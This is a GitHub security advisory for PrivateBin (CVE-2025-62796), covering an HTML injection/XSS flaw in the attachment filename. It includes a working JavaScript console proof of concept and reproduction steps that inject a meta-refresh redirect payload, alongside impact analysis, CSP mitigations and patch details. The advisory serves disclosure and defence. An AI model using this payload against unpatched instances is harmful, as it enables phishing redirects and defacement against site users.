# [M] PrivateBin is missing HTML sanitization of attached filename in file size hint

## Summary
Severity: Medium
Advisory: GHSA-867c-p784-5q6g
CVE: CVE-2025-62796
CWE: CWE-601, CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2025-10-28
Source: https://github.com/advisories/GHSA-867c-p784-5q6g
Type: github-advisory

## Affected
- Packagist: `privatebin/privatebin` — affected >=1.7.7 <2.0.2

## Details
We’ve identified an HTML injection/XSS vulnerability in PrivateBin service that allows the injection of arbitrary HTML markup via the attached filename. Below are the technical details, PoC, reproduction steps, impact, and mitigation recommendations.

**Recommend action:** As the vulnerability has been fixed in the latest version, users are **strongly encouraged** to upgrade PrivateBin to the latest version _and_ [check](https://privatebin.info/directory/check) that a strong CSP header, just as the default suggested one, is delivered.

**Summary of the vulnerability:** The `attachment_name` field containing the attached file name is included in the object that the client encrypts and is eventually rendered in the DOM without proper escaping.

## Impact
The vulnerability allows attackers to inject arbitrary HTML into the filename displayed near the file size hint, when attachments are enabled. This is by definition [a XSS vulnerability (CWE-80)](https://cwe.mitre.org/data/definitions/80.html), in this case even a persistent XSS. As any HTML can be injected, basically, this can e.g. be used to inject [a script tag (as per CWE-79)](https://cwe.mitre.org/data/definitions/79.html).

That said, also due to [previous issues](#more-informaton), we have strong mitigations for this in place. The [content security policy (CSP)](https://content-security-policy.com/) does, if configured as recommend by the PrivateBin project, prevent any inline script execution, so the confidentiality of the paste is _not_ affected.

However, as the reporter demonstrated, even when script execution is blocked, an HTML injection can still be used for attacks such as:
* redirection using a meta redirect tag to redirect to a potentially malicious/attacker-controlled website
* defacement of the website
* phishing, in combination with the redirection to a clone of a PrivateBin phishing page or similar
* potential attacks on other services hosted on the same domain

This list is by no means meant to be exhaustive, other attacks should be considered possible, that is why we treat this issue as a serious issue, even if the CSP is supposed to block the most attacks.

> [!IMPORTANT]  
> Depending on the deployment, if the server has a different than the recommend CSP configured or the client (browser) somehow lacks a protection, the vulnerability can have much more serious impacts and potentially also allow XSS, which could mean the confidentiality of the PrivateBin instance is affected. 

## Technical Description

The front-end uses PrivateBin (client-side encryption) to format and encrypt data before sending. During the paste creation process, the client assembles a `cipherMessage` object containing, among other fields:
* `paste` -> paste text
* `attachment` -> file content (data-URI)
* `attachment_name` -> array with file names

Before encryption, the `ServerInteraction.setCipherMessage(cipherMessage)` function is called. By intercepting/altering the `cipherMessage` on the client immediately before encryption, it is possible to replace `attachment_name` with an attacker-controlled string; this string becomes part of the encrypted content, and when the paste is opened, the local client decrypts and inserts the name into the DOM unescaped, allowing the interpretation of inserted HTML markup.

Note that it was not necessary to reimplement encryption: the monkeypatch modifies the object before the client applies AES-GCM/PBKDF2/compression, thus avoiding ciphertext formatting issues.

## Proof of concept
Paste this into the console on the PrivateBin page before clicking Create.

```js
// Monkeypatch to modify attachment_name immediately before encryption
(() => {
  const desiredName = '"><meta http-equiv="refresh" content="0;url=https://example.com/">.txt'; // <- adjust here

  // get the namespace used by PrivateBin
  if (!window.$ || !$.PrivateBin || !$.PrivateBin.ServerInteraction) {
    return console.error('PrivateBin namespace not found (make sure you are on the PrivateBin page).');
  }

  const SI = $.PrivateBin.ServerInteraction;
  // save original function
  const origSetCipherMessage = SI.setCipherMessage?.bind(SI);

  if (typeof origSetCipherMessage !== 'function') {
    return console.error('setCipherMessage not found or is not a function.');
  }

  SI.setCipherMessage = async function(cipherMessage) {
    try {
      // cipherMessage here is the plain object the client intends to encrypt
      if (cipherMessage && Array.isArray(cipherMessage.attachment_name)) {
        console.log('[patch] original attachment_name:', cipherMessage.attachment_name);
        cipherMessage.attachment_name = cipherMessage.attachment_name.map(() => desiredName);
        console.log('[patch] attachment_name overwritten to:', cipherMessage.attachment_name);
      } else if (cipherMessage && cipherMessage.attachment && Array.isArray(cipherMessage.attachment)) {
        // if there are attachments but no attachment_name (rare), add a coherent array
        cipherMessage.attachment_name = cipherMessage.attachment.map(() => desiredName);
        console.log('[patch] attachment_name added:', cipherMessage.attachment_name);
      } else {
        // nothing to change
      }

      // call the original implementation (which performs the encryption)
      return await origSetCipherMessage(cipherMessage);
    } catch (err) {
      console.error('Error in setCipherMessage monkeypatch:', err);
      // in case of error, attempt to call the original anyway
      return await origSetCipherMessage(cipherMessage);
    }
  };

  console.log('Monkeypatch applied to ServerInteraction.setCipherMessage() - ready to send. (Reload the page to undo).');
})();
```

## Reproduction Steps

1. Access PrivateBin (in the program scope). A requirement is that you have file upload enabled.
2. Attach any file via the UI (file content irrelevant).
3. Open the browser console (F12 → Console).
4. Paste the snippet above and adjust `desiredName` to the desired HTML payload (e.g.,` "><meta http-equiv="refresh" content="0;url=https://example.com/">.txt`).
5. Click Create. The client will encrypt and send the paste normally.
6. Intercept/inspect the POST request (optional).
7. Open the generated link.

**What happens:** When rendering the paste, the content of the injected attachment_name will be interpreted according to the context, demonstrating the impact.

## Mitigation

We strongly recommend you to **upgrade to our latest release**. However, here are some workarounds that may help you to mitigate this vulnerability without upgrade:

* Update the [CSP in your configuration file](https://github.com/PrivateBin/PrivateBin/wiki/Configuration#cspheader) to the latest recommended settings and check that it isn't getting reverted or overwritten by your web server, reverse proxy or CDN, i.e. using [our offered check service](https://privatebin.info/directory/check).
   **Note:** You should check your CSP independently, even if you upgrade to a fixed version. See also the section ["More information"](#more-information) about how we recently enhanced the CSP protection. 
* Deploying PrivateBin on a separate domain may limit the scope of the vulnerability to PrivateBin itself and thus, as described in the “Impact” section, effectively prevent any damage by the vulnerability to other resources you are hosting.
* As explained in the impact assessment, disabling attachments also prevents this issue.

## Patches

The issue has been patched in version 2.0.2. The change that displayed the attachment name without sanitation was introduced in version 1.7.7. The code-changes in PrivateBin mitigating this issue can be found in commit c4f8482b3072be7ae012cace1b3f5658dcc3b42e.

## References
We highly encourage server administrators and others involved with the PrivateBin project to read-up on how Content-Security-Policies work, especially should you consider to manually adjust it:
* https://content-security-policy.com/
* https://developer.mozilla.org/docs/Web/HTTP/CSP
* https://developers.google.com/web/fundamentals/security/csp/

Also please note that if multiple headers are set (as e.g. done via our introduced meta tag) [browsers should apply the most restrictive set of the policies](https://stackoverflow.com/a/51153816/5008962), [as per the CSP specification](https://www.w3.org/TR/CSP2/#enforcing-multiple-policies).

## More information
This issue is similar to https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-cqcc-mm6x-vmvw, but was, based on our analysis, apparently introduced in https://github.com/PrivateBin/PrivateBin/pull/1550.

Note that we have, independently as of this issue and as per regular security maintenance, already applied many CSP improvements and strengthened this security mechanism of PrivateBin. This includes in detail:
* As part of the [last XSS vulnerability](#more-information), we have now included the CSP in a meta HTML tag, too, so in case the headers are somehow mangled with by (reverse) proxies or similar, the PrivateBin instance should still be protected as long as this HTML meta tag is included in an unchanged way.
* https://github.com/PrivateBin/PrivateBin/pull/1613 - We have removed a outdated configuration recommendation, as `default-src` does not need to allow `self` anymore, but it can keep the more strict `none` even when using the bootstrap SVG icons. ([previously a problem in Firefox prevented this](https://bugzilla.mozilla.org/show_bug.cgi?id=1773976))
* https://github.com/PrivateBin/PrivateBin/pull/1464 - We could remove the previously used `unsafe-eval` that was a potentially risky CSP source being allowed for scripts, and replaced it with `wasm-unsafe-eval` for the streaming of a WebAssembly component used for optional compression. This can be disabled in the configuration and then `wasm-unsafe-eval` can also be removed.

In case you have not noticed this and did not upgrade your CSP header yet, **we strongly recommend to do it as soon as possible**!

## Credits

On Thursday October 23rd, 2025 we received a report via email at security@privatebin.org. The reporter asked to stay anonymous. We thank them a lot for the detailed reporting of this vulnerability, including the description of the proof of concept listed above!

In general, we'd like to thank everyone reporting issues and potential vulnerabilities to us.

If you think you have found a vulnerability or potential security risk, [we'd kindly ask you to follow our security policy](https://github.com/PrivateBin/PrivateBin/blob/master/SECURITY.md) and report it to us. We then assess the report and will take the actions we deem necessary to address it.

## References
- https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-867c-p784-5q6g
- https://nvd.nist.gov/vuln/detail/CVE-2025-62796
- https://github.com/PrivateBin/PrivateBin/pull/1550
- https://github.com/PrivateBin/PrivateBin/commit/c4f8482b3072be7ae012cace1b3f5658dcc3b42e
- https://github.com/PrivateBin/PrivateBin
